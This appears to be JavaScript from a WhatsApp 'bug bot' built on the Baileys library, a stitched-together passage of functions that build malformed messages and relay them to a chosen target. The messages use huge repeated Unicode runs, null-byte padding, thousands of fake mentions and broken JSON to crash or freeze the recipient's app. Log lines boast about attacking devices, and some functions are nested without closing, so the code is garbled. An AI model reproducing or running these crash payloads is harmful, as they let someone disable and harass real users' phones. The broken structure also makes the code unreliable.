                { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(9000) + salsa },  
                { name: "single_select", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(5000) + salsa }  
              ],  
              nativeFlowResponseMessage: {  
                name: "galaxy_message",  
                paramsJson: "\u0000".repeat(6000),  
                version: 3  
              },  
              contextInfo: {  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(
                    { length: 1900 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )  
                ]  
              }  
            }  
          }  
        }  
      }  
    };

    for (const msg of [msg1, msg2, msg3]) {  
      await Abim.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`Wolker Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`);  
    }

  } catch (e) {
    console.error(e);
  }
}
async function crasphoneNew(target) {
let xios = "𑇂𑆵𑆴𑆿".repeat(8000)

  await generateWAMessageFromContent(target, proto.Message.fromObject({
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/json",
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "999999999999",
              pageCount: 7.554679297577082e+23,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: "҉A⃠M⃠E⃠⃠L⃠I⃠A⃠ ¿?",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1715880173"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "҉A⃠M⃠E⃠⃠L⃠I⃠A⃠ ¿?" + xios
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              name: "galaxy_message",
              flow_action: "navigate",
              flow_action_payload: { screen: "CTZ_SCREEN" },
              flow_cta: "🍏",
              flow_id: "UNDEFINEDONTOP",
              flow_message_version: "9.903",
              flow_token: "UNDEFINEDONTOP"
            })
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [{
              groupJid: "1@newsletter",
              groupSubject: "UNDEFINEDONTOP"
            }]
          }
        }
      }
    }
  }), {});

  await Abim.relayMessage(target, {
    contactMessage: {
      displayName: "҉A⃠M⃠E⃠⃠L⃠I⃠A⃠¿?" + "𑇂𑆵𑆴𑆿".repeat(60000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:A⃠M⃠E⃠⃠L⃠I⃠A⃠ ¿?
FN:A⃠M⃠E⃠L⃠I⃠A⃠ ¿?
item1.TEL;waid=526421147692:526421147692
item1.X-ABLabel:Click here to chat
item2.EMAIL;type=INTERNET:YT: https://youtube.com/@AmeliaModders
item2.X-ABLabel:YouTube
item4.ADR:;;Brasil, AM, SP;;;;
item4.X-ABLabel:Region
END:VCARD`,
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, {});

  await Abim.relayMessage(target, {
    locationMessage: {
      degreesLatitude: 173.282,
      degreesLongitude: -19.378,
      name: "Sedikit Sakit Namun Berusaha Buat Tetap Sabar" + "𑇂𑆵𑆴𑆿".repeat(6000),
      url: "https://youtube.com/@Ameliamodders",
        contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, {
    participant: { jid: target }
  });
}
async function Blopop(target) {
  try {
    const bimesc = "ꦽꦽꦽ".repeat(5000);
    const msg1 = {
      viewOnceMessage: {
        message: {
          inviteExpiration: "1",
          caption: "ꦽ".repeat(600),
          interactiveMessage: {
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989
            },
            nativeFlowMessage: {
              buttons: [
                {
                  body: {
                    text: "𝖆𝖇𝖎𝖒 official" + "ꦽ".repeat(2000)
                  }
                }
              ],
              messageParamsJson: "[{".repeat(10000)
            }
          },
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              stanzaId: "1234567890ABCDEF"
            }
          },
          contextInfo: {
            fromMe: false,
            url: "https://example.com/video.mp4",
            mimetype: "video/mp4",
            callType: "REGULAR",
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          }
        }
      }
    };

    const msg2 = {
      quotedMessage: {
        businessMessageForwardInfo: {
          hasMediaAttachment: false,
          businessOwnerJid: target,
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  xternalAdReply: {
                    title: "Abimofficial",
                    text: "Hii gw 𝖆𝖇𝖎𝖒" + "ꦽ".repeat(2000),
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 1814400000
                  }
                },
                nativeFlowMessage: {
                  buttons: [
                    { body: { text: bimesc } },
                    { nativeFlowMessage: {} },
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {} },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "net", attrs: { medium: "3" } },
                    {
                      tag: "capability",
                      attrs: { ver: "1" },
                      content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                    },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {} }
                  ]
                }
              }
            }
          }
        }
      }
    };

    const msg3 = {
      TextMessage: {
        text: "Hii I`M Abim\nhttps://wa.me/stickerpack/Abim",
        description: "𑇂𑆵𑆴𑆿".repeat(12000),
        title: "Mokad kau dek" + "𑇂𑆵𑆴𑆿".repeat(5000),
        previewType: "NONE",
        jpegThumbnail: null
      }
    };

    const msg4 = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𑇂𑆵𑆴𑆿",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "ꦽꦽꦽ",
                address: "𑇂𑆵𑆴𑆿".repeat(1000)
              }
            },
            body: { text: "HAI KONTOL" },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                payload: "ꦽꦽꦽ".repeat(300000),
                contextInfo: {
                  participant: "targetjid@s.whatsapp.net",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                key: {
                  remoteJid: "5521992999999@s.whatsapp.net",
                  fromMe: false,
                  id: "CALL_MSG_" + Date.now(),
                  participant: "5521992999999@s.whatsapp.net"
                },
                message: {
                  callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: "5521992999999@s.whatsapp.net",
                        callOutcome: "1"
                      }
                    ]
                  }
                }
              })
            }
          }
        }
      }
    };
async function KxHJule(sock, target) {
  const KxHNayen = Array.from({ length: 30000 }, (_, r) => ({
     title: "ꦾ".repeat(90000) + "ꦽ".repeat(90000) + "\u0003".repeat(9000),
     rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));
  
  const msg = {
   viewOnceMessage: {
       message: {
           listResponseMessage: {
              title: "KxH - King Narendra",
              listType: 2,
              buttonText: null,
              sections: KxHNayen,
              singleSelectReply: { selectedRowId: "KxH - King Narendra" },
                contextInfo: {
                  mentionedJid: Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "5521992999999@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "𝐐𝐔𝐀𝐍𝐓𝐔𝐌"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }     
    };
        
    await Abim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });
  
  const KxHNayen2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { 
                            text: "⟅༑", 
                            format: "DEFAULT" 
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        const button2 = await generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "KxH - King Narendra" + "𑆿𑆴𑆿".repeat(6000)
                },
                nativeFlowResponseMessage: {
                    name: "button_reply",
                    paramsJson: JSON.stringify({ id: "option_a" })
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        await Abim.relayMessage("status@broadcast", KxHNayen2.message, {
            messageId: KxHNayen2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });

        await Abim.relayMessage("status@broadcast", KxHNayen2.message, {
            messageId: KxHNayen2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
        
       console.log(`Succes Send Delay Invisible ${target}`);
    }
    
    const list = [msg1, msg2, msg3, msg4];

    for (const msg of list) {
      await Abim.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });
    }

async function CrashButton(sock, target) {
    const message = {
        viewOnceMessage: {
            message: {
                requestPaymentMessage: {
                    body: {
                        text: "#exercist",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "review_and_pay",
                        paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                        version: 3
                    }
                }
            }
        }
    };

    await Abim.relayMessage(target, message, {
        groupId: null,
        participant: { jid: target }
    });
}

    console.log(
      `[ - Wolker Attacked Sending Bug Forclose To ${target} suksesfull 🧪 ]`
    );
  } catch (e) {
    console.error(e);
  }
}
async function fcinvisotax(target) {
  let baileysLib = null;
  try { baileysLib = require('@whiskeysockets/baileys'); } catch (e1) { try { baileysLib = require('@whiskeysockets/baileys'); } catch (e2) { baileysLib = null; } }

  const encodeWAMessageFn = baileysLib?.encodeWAMessage ?? Abim.encodeWAMessage?.bind(Abim) ?? ((msg) => {
    try { return Buffer.from(JSON.stringify(msg)); } catch (e) { return Buffer.from([]); }
  });

  const encodeSignedDeviceIdentityFn = baileysLib?.encodeSignedDeviceIdentity ?? Abim.encodeSignedDeviceIdentity?.bind(Abim) ?? null;

  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const janda = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };
async function CursedBlankInvisible(sock, target) {
  const buttons = [
    { name: "single_select", buttonParamsJson: "" }
  ];
  
  for (let i = 0; i < 1; i++) {
    buttons.push(
      { 
        name: "cta_url", 
        buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
      },
      { 
        name: "cta_copy", 
        buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
      },
      { 
        name: "quick_reply", 
        buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
      },
    );
  }

  await Abim.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 18144000,
                },
              },
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    title: "HELLO SYSTEM",
                    imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                      fileLength: "9999999999999",
                      height: 9999,
                      width: 9999,
                      mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                      fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                      directPath:
                        "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1755254367",
                      jpegThumbnail:
                        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
                    },
                    hasMediaAttachment: true,
                  },
                  body: {
                    text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "{".repeat(1000),
                    buttons: buttons,
                  },
                },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}
async function FcSpam(target) {
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `application/was`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  let KodratHnctMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };
  
  const KodratHnctMsg2 = await generateWAMessageFromContent(target, KodratHnctMsg, {});
  await sock.relayMessage("status@broadcast", KodratHnctMsg2.message, {
    messageId: KodratHnctMsg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  let KodratHnctMsg3 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "HelloSystem",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"KDRT\",\"tower_number\":\"KDRT\",\"city\":\"chindo\",\"name\":\"KDRT\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"💢 ${"\u0000".repeat(900000)}\"}}`,
              version: 3
            },
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0")
    }
  );

  await Abim.relayMessage("status@broadcast", KodratHnctMsg3.message, {
    messageId: KodratHnctMsg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}
async function RxRxMika(sock, target) {
  const X = { sendPaymentMessage: {} };
  const Linux = { sendPaymentMessage: {} };

  await sock.sendMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      amount1000: 1000000000000,
      requestFrom: target
    }
  });

  {
    const RxR = { requestPaymentMessage: {} };

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
      if (type !== 'notify') return;

      const m = messages?.[0];
      if (!m?.message) return;

      const text =
        m.message.conversation ||
        m.message.extendedTextMessage?.text ||
        "𑇂𑆵𑆴𑆿𑆿".repeat(9999);

      if (text.length < 1000) return;

      await sock.sendMessage(
        m.key.remoteJid,
        X,
        { ...Linux, quoted: m }
      );
    });
  }

  {
    const Y = { declinePaymentMessage: {} };
    const Z = { CancelPaymentRequestMessage: {} };
    const V = { paymentInviteMessage: {} };

    const leaks = [];
    setInterval(() => {
      leaks.push(Buffer.alloc(1000000, ' '));
      if (leaks.length > 100) leaks.splice(0, 50);
    }, 1000);

    const crypto = require('crypto');
    const messageId = crypto.randomBytes(16).toString('hex');

    await Abim.relayMessage(
      target,
      X,
      { messageId }
    );
  }

  {
    const RxR2 = { sendPaymentMessage: {} };
    const leaks = [];

    (() => {
      leaks.push(Buffer.alloc(1000000, ' '));
      if (leaks.length > 100) leaks.splice(0, 50);
    })();

    const crypto = require('crypto');
    const messageId = crypto.randomBytes(16).toString('hex');

    await Abim.relayMessage(
      target,
      X,
      { messageId }
    );
  }
}
async function HxDZiaoXang(target) {
  const ElHxD = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            videoMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4",
              mimetype: "video/mp4",
              caption: "Ziao Xang adalah seorang ci i o😙🗿🌪️😙☠️❤️‍🩹😭👈⚡😜⚡",
              fileSha256: Buffer.from(
                "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                "base64"
              ),
              fileEncSha256: Buffer.from(
                "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                "base64"
              ),
              mediaKey: Buffer.from(
                "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                "base64"
              ),
              directPath:
                "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
              fileLength: 12260,
              seconds: 1,
              mediaKeyTimestamp: Math.floor(Date.now() / 1000),
            },
          },
          body: {
            text: "HxD - ZiaoXang" + "\uB100".repeat(2000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "𑜦𑜠".repeat(100400),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "こんにちは",
                  id: "📌",
                }),
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "MasDev",
                  url: "https://t.me/unkwon",
                  merchant_url: "https://t.me/Unkwon",
                }),
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: null,
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "\uB100",
                  id: "message",
                  copy_code: "\n".repeat(20000),
                }),
              },
              {
                name: "cta_reminder",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: "message",
                }),
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: "message",
                }),
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "WEBSITE!!!",
                  url: "https://" + "𑜦𑜠".repeat(5000) + ".my.id",
                }),
              },
            ],
          },
        },
      },
    },
  };
  await Abim.relayMessage(target, ElHxD.message, { messageId: ElHxD.key?.id });
}
async function SemestaOneHit(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    buttonsMessage: {
        contentText: "SEMESTA - JAYA",
        footerText: "\u0000",
        buttons: [
          {
            buttonId: "KenalZunGaBg?",
            buttonText: { 
              displayText: "\n".repeat(9000),
            },
            type: 1,
          },
        ],
        headerType: 1,
        contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\u0000".repeat(104500),
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            participant: target,
            remoteJid: "X",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          annotations: [
            {
              embeddedContent: {
                X,
              },
              embeddedAction: true,
            },
          ],
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
 const DelayIn = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "BULLDOZER - SEMESTA JAYA ▾" },
            footer: { text: "Buy pt? Pv" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
